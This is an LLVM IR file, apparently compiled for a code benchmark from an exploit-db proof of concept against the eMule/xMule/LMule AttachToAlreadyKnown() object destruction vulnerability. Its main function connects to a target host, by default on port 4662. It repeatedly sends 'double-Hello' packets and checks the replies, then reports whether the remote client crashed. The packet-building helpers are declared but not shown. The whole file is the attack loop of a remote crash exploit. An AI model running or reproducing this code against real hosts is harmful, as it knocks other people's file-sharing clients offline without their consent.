; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23040.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23040.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [164 x i8] c"eMule/xMule/LMule AttachToAlreadyKnown() Object Destruction vulnerability\0Aproof of concept code\0ACopyright (C) 2003 R\EF\BF\BDmi Denis-Courmont <exploit@simutrans.fr.st>\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"4662\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"Connecting to [%s]:%s ...\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"Sending double-Hello packet (%d)...\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"Error\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"Checking reply ...\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [21 x i8] c"%s: malformed reply\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"%s might be vulnerable.\0A\00", align 1
@.str.8 = private unnamed_addr constant [23 x i8] c"%s is not vulnerable.\0A\00", align 1
@MAXTRIES = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [69 x i8] c"%s is still alive after %d deadly packets. Probably not vulnerable.\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c"Remote host seems to have crashed!\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @puts(i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @usage(i8* %16)
  store i32 %17, i32* %3, align 4
  br label %93

18:                                               ; preds = %2
  store i32 0, i32* %7, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  store i8* %21, i8** %8, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 3
  br i1 %23, label %24, label %25

24:                                               ; preds = %18
  br label %29

25:                                               ; preds = %18
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  br label %29

29:                                               ; preds = %25, %24
  %30 = phi i8* [ getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), %24 ], [ %28, %25 ]
  store i8* %30, i8** %9, align 8
  %31 = load i8*, i8** %8, align 8
  %32 = load i8*, i8** %9, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %31, i8* %32)
  br label %34

34:                                               ; preds = %83, %29
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %38, label %43

38:                                               ; preds = %34
  %39 = load i8*, i8** %8, align 8
  %40 = load i8*, i8** %9, align 8
  %41 = call i32 @socket_connect(i8* %39, i8* %40)
  store i32 %41, i32* %6, align 4
  %42 = icmp ne i32 %41, -1
  br label %43

43:                                               ; preds = %38, %34
  %44 = phi i1 [ false, %34 ], [ %42, %38 ]
  br i1 %44, label %45, label %84

45:                                               ; preds = %43
  %46 = load i32, i32* %7, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0), i32 %46)
  %48 = load i32, i32* %6, align 4
  %49 = call i64 @send_2hello(i32 %48)
  %50 = icmp ne i64 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %45
  %52 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %7, align 4
  br label %53

53:                                               ; preds = %51, %45
  %54 = call i32 @puts(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %55 = load i32, i32* %6, align 4
  %56 = call i64 @recv_hello(i32 %55)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %62

58:                                               ; preds = %53
  %59 = load i32, i32* @stderr, align 4
  %60 = load i8*, i8** %8, align 8
  %61 = call i32 @fprintf(i32 %59, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* %60)
  store i32 -1, i32* %7, align 4
  br label %73

62:                                               ; preds = %53
  %63 = load i32, i32* %6, align 4
  %64 = call i64 @recv_hello(i32 %63)
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %69

66:                                               ; preds = %62
  %67 = load i8*, i8** %8, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i8* %67)
  br label %72

69:                                               ; preds = %62
  %70 = load i8*, i8** %8, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i64 0, i64 0), i8* %70)
  store i32 -1, i32* %7, align 4
  br label %72

72:                                               ; preds = %69, %66
  br label %73

73:                                               ; preds = %72, %58
  %74 = load i32, i32* %6, align 4
  %75 = call i32 @close(i32 %74)
  %76 = load i32, i32* %7, align 4
  %77 = load i32, i32* @MAXTRIES, align 4
  %78 = icmp sge i32 %76, %77
  br i1 %78, label %79, label %83

79:                                               ; preds = %73
  %80 = load i8*, i8** %8, align 8
  %81 = load i32, i32* %7, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.9, i64 0, i64 0), i8* %80, i32 %81)
  store i32 0, i32* %3, align 4
  br label %93

83:                                               ; preds = %73
  br label %34

84:                                               ; preds = %43
  %85 = load i8*, i8** %8, align 8
  %86 = call i32 @gai_perror(i8* %85)
  %87 = load i32, i32* %7, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %91

89:                                               ; preds = %84
  %90 = call i32 @puts(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %93

91:                                               ; preds = %84
  br label %92

92:                                               ; preds = %91
  store i32 1, i32* %3, align 4
  br label %93

93:                                               ; preds = %92, %89, %79, %13
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket_connect(i8*, i8*) #1

declare dso_local i64 @send_2hello(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @recv_hello(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @gai_perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
